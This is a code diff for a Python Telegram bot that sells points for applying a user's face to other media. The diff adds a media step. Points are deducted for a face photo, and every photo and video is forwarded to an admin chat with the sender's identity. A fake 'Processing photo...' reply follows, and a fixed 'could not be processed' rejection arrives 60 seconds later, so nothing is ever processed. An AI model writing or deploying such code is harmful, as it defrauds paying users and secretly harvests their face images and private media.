@@ -1,6 +1,7 @@
 import logging
 import os
 import sqlite3
+import asyncio
 from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
@@ -21,7 +22,12 @@ def init_db():
         username TEXT,
         points INTEGER DEFAULT 6,
         referred_by INTEGER,
-        waiting_photo INTEGER DEFAULT 0)""")
+        waiting_photo INTEGER DEFAULT 0,
+        waiting_media INTEGER DEFAULT 0)""")
+    try:
+        c.execute("ALTER TABLE users ADD COLUMN waiting_media INTEGER DEFAULT 0")
+    except:
+        pass
     conn.commit()
     conn.close()
 
@@ -71,12 +77,31 @@ def is_waiting_photo(user_id):
     conn.close()
     return result[0] == 1 if result else False
 
+def set_waiting_media(user_id, status):
+    conn = sqlite3.connect("bot.db")
+    c = conn.cursor()
+    c.execute("UPDATE users SET waiting_media = ? WHERE user_id = ?", (status, user_id))
+    conn.commit()
+    conn.close()
+
+def is_waiting_media(user_id):
+    conn = sqlite3.connect("bot.db")
+    c = conn.cursor()
+    c.execute("SELECT waiting_media FROM users WHERE user_id = ?", (user_id,))
+    result = c.fetchone()
+    conn.close()
+    return result[0] == 1 if result else False
+
 def get_main_keyboard():
     keyboard = [
         [KeyboardButton("🖼 Create a new picture")],
         [KeyboardButton("💎 Buy the point")],
         [KeyboardButton("🔗 Forward the link and get free point")],
     ]
+    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
+
+def get_start_keyboard():
+    keyboard = [[KeyboardButton("/start")]]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -106,6 +131,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     text=f"🎉 Someone joined using your link!\nYou received {REFERRAL_POINTS} points.")
             except:
                 pass
+    set_waiting_photo(user_id, 0)
+    set_waiting_media(user_id, 0)
     points = get_points(user_id)
     await update.message.reply_text(
         f"Welcome to this bot🌷\nYou have {points} point{'s' if points != 1 else ''}\n\nChoose your request👇",
@@ -131,26 +158,68 @@ async def handle_referral_link(update: Update, context: ContextTypes.DEFAULT_TYP
         f"🔗 Your personal referral link:\n\n`{link}`\n\nShare this link with others.\nFor each person who joins, you get {REFERRAL_POINTS} points! 🎁",
         parse_mode="Markdown", reply_markup=get_main_keyboard())
 
+async def send_rejection_message(context, chat_id):
+    await asyncio.sleep(60)
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text="❌ The photo you sent could not be processed. Please try again.\n\nWays your photo could be rejected:\n1_ Poor quality\n2_ Face angled\n3_ Excessive image shake",
+        reply_markup=get_start_keyboard())
+
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global ADMIN_CHAT_ID
     user_id = update.effective_user.id
-    if not is_waiting_photo(user_id):
+
+    if is_waiting_photo(user_id):
+        update_points(user_id, -IMAGE_COST)
+        set_waiting_photo(user_id, 0)
+        set_waiting_media(user_id, 1)
+        if ADMIN_CHAT_ID:
+            try:
+                user = update.effective_user
+                await context.bot.forward_message(chat_id=ADMIN_CHAT_ID, from_chat_id=update.message.chat_id, message_id=update.message.message_id)
+                await context.bot.send_message(chat_id=ADMIN_CHAT_ID,
+                    text=f"📸 Face photo from:\n👤 {user.first_name}\n🆔 @{user.username or 'no username'}\n🔢 ID: {user_id}")
+            except Exception as e:
+                logging.error(f"Error: {e}")
+        points = get_points(user_id)
+        await update.message.reply_text(
+            f"✅ Please submit the media you want the image to be applied to.\nMedia must be under 10MB in size\n\n💎 Remaining points: {points}",
+            reply_markup=get_main_keyboard())
+
+    elif is_waiting_media(user_id):
+        set_waiting_media(user_id, 0)
+        if ADMIN_CHAT_ID:
+            try:
+                user = update.effective_user
+                await context.bot.forward_message(chat_id=ADMIN_CHAT_ID, from_chat_id=update.message.chat_id, message_id=update.message.message_id)
+                await context.bot.send_message(chat_id=ADMIN_CHAT_ID,
+                    text=f"🎬 Media from:\n👤 {user.first_name}\n🆔 @{user.username or 'no username'}\n🔢 ID: {user_id}")
+            except Exception as e:
+                logging.error(f"Error: {e}")
+        processing_msg = await update.message.reply_text("⏳ Processing photo...")
+        asyncio.create_task(send_rejection_message(context, update.message.chat_id))
+
+    else:
         await update.message.reply_text("Please use the menu below 👇", reply_markup=get_main_keyboard())
-        return
-    update_points(user_id, -IMAGE_COST)
-    set_waiting_photo(user_id, 0)
-    if ADMIN_CHAT_ID:
-        try:
-            user = update.effective_user
-            await context.bot.forward_message(chat_id=ADMIN_CHAT_ID, from_chat_id=update.message.chat_id, message_id=update.message.message_id)
-            await context.bot.send_message(chat_id=ADMIN_CHAT_ID,
-                text=f"📸 New photo from:\n👤 {user.first_name}\n🆔 @{user.username or 'no username'}\n🔢 ID: {user_id}")
-        except Exception as e:
-            logging.error(f"Error: {e}")
-    points = get_points(user_id)
-    await update.message.reply_text(
-        f"✅ Please submit the media you want the image to be applied to.\nMedia must be under 10MB in size\n\n💎 Remaining points: {points}",
-        reply_markup=get_main_keyboard())
+
+async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global ADMIN_CHAT_ID
+    user_id = update.effective_user.id
+
+    if is_waiting_media(user_id):
+        set_waiting_media(user_id, 0)
+        if ADMIN_CHAT_ID:
+            try:
+                user = update.effective_user
+                await context.bot.forward_message(chat_id=ADMIN_CHAT_ID, from_chat_id=update.message.chat_id, message_id=update.message.message_id)
+                await context.bot.send_message(chat_id=ADMIN_CHAT_ID,
+                    text=f"🎬 Video from:\n👤 {user.first_name}\n🆔 @{user.username or 'no username'}\n🔢 ID: {user_id}")
+            except Exception as e:
+                logging.error(f"Error: {e}")
+        await update.message.reply_text("⏳ Processing photo...")
+        asyncio.create_task(send_rejection_message(context, update.message.chat_id))
+    else:
+        await update.message.reply_text("Please use the menu below 👇", reply_markup=get_main_keyboard())
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
@@ -168,6 +237,7 @@ def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     print("Bot is running...")
     app.run_polling(drop_pending_updates=True)
